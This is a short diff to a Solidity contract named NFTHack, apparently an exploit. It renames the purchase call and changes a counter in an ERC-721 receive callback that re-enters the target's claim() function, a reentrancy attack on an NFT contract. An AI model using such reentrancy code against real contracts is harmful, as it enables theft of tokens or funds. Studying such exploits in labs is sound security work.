@@ -14,7 +14,7 @@ contract NFTHack{
     }
 
     function buy() external payable {
-        (bool success, )  = target.call{value: msg.value}(abi.encodeWithSignature("buyNFT()"));
+        (bool success, )  = target.call{value: msg.value}(abi.encodeWithSignature("buy()"));
         require(success, "Buying NFT FAILED"); 
         
     }
@@ -32,7 +32,7 @@ contract NFTHack{
         // target.call(abi.encodeWithSignature("balanceOf(address)",addr));
         counter+=1;
         
-        if(counter>4){
+        if(counter>0){
             return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
         }
         (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
